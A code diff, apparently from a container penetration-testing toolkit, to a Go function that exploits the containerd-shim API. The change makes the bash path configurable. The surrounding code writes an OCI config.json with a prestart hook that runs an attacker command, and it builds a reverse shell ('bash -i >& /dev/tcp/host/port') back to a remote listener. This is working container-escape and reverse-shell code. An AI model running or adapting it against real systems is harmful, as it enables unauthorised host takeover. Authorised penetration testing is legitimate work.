@@ -49,7 +49,7 @@ var configJson = `
       "gid": 0
     },
     "args": [
-      "/bin/bash"
+      "$BASH_PATH$"
     ],
     "env": [
       "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
@@ -65,7 +65,7 @@ var configJson = `
   "hooks": {
         "prestart": [
             {
-                "path": "/bin/bash",
+                "path": "$BASH_PATH$",
                 "args": ["bash", "-c", "$SHELLCMD$"],
                 "env":  ["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"]
             }
@@ -137,9 +137,10 @@ func containerdShimApiExp(sock, shellCmd, rhost, rport string) error {
 	} else {
 		payloadShellCmd = fmt.Sprintf("bash -i >& /dev/tcp/%s/%s 0>&1", rhost, rport)
 	}
-	configJson = strings.Replace(configJson, "$SHELLCMD$", payloadShellCmd, -1)
+	config := strings.Replace(configJson, "$BASH_PATH$", util.BashPath(), -1)
+	config = strings.Replace(config, "$SHELLCMD$", payloadShellCmd, -1)
 
-	err = ioutil.WriteFile(localBundlePath+"/config.json", []byte(configJson), 0666)
+	err = ioutil.WriteFile(localBundlePath+"/config.json", []byte(config), 0666)
 	if err != nil {
 		return &errors.CDKRuntimeError{Err: err, CustomMsg: "failed to write file."}
 	}
